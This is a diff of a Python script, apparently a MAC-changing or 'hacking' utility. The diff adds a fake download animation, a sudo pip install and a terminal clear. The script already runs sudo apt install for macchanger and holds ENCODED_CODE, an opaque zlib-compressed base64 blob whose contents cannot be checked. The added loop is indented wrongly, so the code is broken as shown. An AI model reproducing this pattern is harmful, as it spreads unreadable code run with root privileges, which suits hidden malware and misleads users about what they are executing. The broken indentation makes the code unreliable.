@@ -3,7 +3,14 @@ import time
 import zlib, base64
 from colorama import Fore,Back, Style, init
 
+print(Fore.GREEN + "[-] Downloading Requirements", end="")
+
+    for i in range(3):
+        print(".", end="", flush=True)
+        time.sleep(0.2)
+subprocess.run(['sudo','pip', 'install', '-r', 'requirements.txt'])
 subprocess.run(['sudo', 'apt', 'install', 'macchanger'])
+subprocess.run(['clear'])
 
 init(autoreset=True)
 ENCODED_CODE = "eJyVVF1v0zAUfc+vuMpeksFq0BAPlfpQ2m4gdQOtHdMkS1aauqu1xi6JC4rwJP4D/5BfwvVHOpfyMktJnXPPvef6uPaqVhWUaqPqoipAVFtVa7hQNX8NM91u8EdIoRP7yoqdxkDD9WBe73ieJEu+gmatfrBFISWvs7yfAA7/BQOoV2maJj9tud7ofnj9BMwNcCNMWIcFOEZiehQ5hgBimczCANTGCT45QOaZkHvazWT8ZAKBdrHniXERIIY6KcbIHiG+b3ogaGx96oQIkBwMgIMQMcZFEA4IfZ5krgNi0/CxoHHzDAy1fWOU0kMd46gGkzKGKczq2J6dTsZQpkNsyASTqGPbkgH0HNcouAk5lsF3FrzG8sHsA//snmXQyeFa94JhYbGg9814Oqb9f13QWYEd0mAJWJ9oKIykSCbYFq8rKoSTf/1DceL2qUuxjmN1xoxrGKeEMu9NMJLQfflIJ+yTI2PegX/eEObX76xHojXF/pE8HFSsUGAzzwhJOXNr91/U0I6S2BNlsW0tpM78UcsjxHVxNbycXM+H8ArSkxO4FPrjboGMPqy13jZ9Qh6EXu8WvVJVZPyufpyVrV6fp0d1PkxvJ6HInG/4A14SURHdqzhZYnrj0hlWPC5xP5lOP9/ZImcpnML7NzEjHbeyqEQJV8MRzLZKrYR8gLlSG/jz6zfcKF1oDp+WXGqhW5iKRw4F3K053/ReKvWVy6Wq4UuBF5wffbgQdaPhHBat5g1kI1VtC9nmVI75d1FyuJXi2w4bGFvytIi5nnHWbHkpVqLMX9oOlenpW7xDE7HCk4EucDwVgwGkjFWFkIyl/jI9uF+Tv5rKgzY="
